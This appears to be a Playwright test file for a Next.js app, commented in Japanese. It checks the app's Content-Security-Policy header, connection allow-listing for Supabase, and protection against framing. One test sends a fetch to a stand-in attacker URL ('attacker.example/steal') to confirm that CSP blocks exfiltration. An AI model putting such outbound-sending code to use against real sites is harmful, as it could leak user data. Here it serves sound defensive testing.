import { expect, test, type Page } from "@playwright/test";

// 本番ビルドのアプリで、CSP が付いていて、アプリの通常の操作が CSP に弾かれないことを確かめる。
// ビルド時の NEXT_PUBLIC_SUPABASE_URL(CI では placeholder)が接続先として許可される。
const SUPABASE_ORIGIN = "https://placeholder.supabase.co";

// ページ内で起きた CSP 違反(securitypolicyviolation)を集める。
async function collectViolations(page: Page) {
  await page.addInitScript(() => {
    (window as unknown as { __cspViolations: string[] }).__cspViolations = [];
    document.addEventListener("securitypolicyviolation", (event) => {
      (window as unknown as { __cspViolations: string[] }).__cspViolations.push(
        `${event.violatedDirective}: ${event.blockedURI}`
      );
    });
  });
  return () =>
    page.evaluate(() => (window as unknown as { __cspViolations: string[] }).__cspViolations);
}

test("CSP ヘッダが付いている", async ({ request }) => {
  const response = await request.get("/");
  const csp = response.headers()["content-security-policy"];
  expect(csp).toBeTruthy();
  expect(csp).toContain("frame-ancestors 'none'");
  expect(csp).toContain(SUPABASE_ORIGIN);
});

test("通常の操作(記録・一覧・各ページ)で CSP に弾かれるものが無い", async ({ page }) => {
  const violations = await collectViolations(page);
  const failedRequests: string[] = [];
  page.on("pageerror", (error) => failedRequests.push(error.message));

  await page.goto("/");
  // 水和(インラインscript)・フォント・manifest・サービスワーカーまで一通り動く。
  await page.getByRole("button", { name: "🌙 今夜の様子を記録する" }).click();
  await page.getByRole("button", { name: /穏やか/ }).first().click();
  await page.getByLabel("メモ").fill("CSPの確認");
  await page.getByRole("button", { name: "✓ この日の記録を保存する" }).click();
  await expect(page.getByRole("button", { name: /穏やかな夜/ })).toBeVisible();

  for (const name of [/これまで/, /傾向/, /試したこと/, /共有/]) {
    await page.getByRole("navigation", { name: "メインメニュー" }).getByRole("link", { name }).click();
    await page.waitForLoadState("networkidle");
  }
  await page.evaluate(async () => (await navigator.serviceWorker.ready).active?.state);

  expect(await violations()).toEqual([]);
  expect(failedRequests).toEqual([]);
});

test("接続先は Supabase だけ許可され、他のサイトへの送信は CSP が止める", async ({ page }) => {
  const violations = await collectViolations(page);
  await page.goto("/");

  const attempt = (url: string) =>
    page.evaluate(async (target) => {
      try {
        await fetch(target, { mode: "no-cors" });
        return "sent";
      } catch {
        return "blocked-or-failed";
      }
    }, url);

  // 許可していない接続先: CSP 違反として記録される。
  await attempt("https://attacker.example/steal");
  expect(await violations()).toEqual([expect.stringContaining("connect-src: https://attacker.example")]);

  // Supabase の接続先: CSP では止められない(通信自体はこの環境から出られず失敗してよい)。
  await attempt(`${SUPABASE_ORIGIN}/rest/v1/`);
  const after = await violations();
  expect(after.filter((v) => v.includes("placeholder.supabase.co"))).toEqual([]);
});

test("フレームへの埋め込みは禁止されている", async ({ page, baseURL }) => {
  await page.goto("about:blank");
  await page.setContent(`<iframe id="f" src="${baseURL}/"></iframe>`);
  await page.waitForTimeout(1500);
  const embedded = await page.evaluate(() => {
    const frame = document.getElementById("f") as HTMLIFrameElement;
    try {
      return frame.contentDocument?.body?.innerText?.includes("今夜") ?? false;
    } catch {
      return false;
    }
  });
  expect(embedded).toBe(false);
});
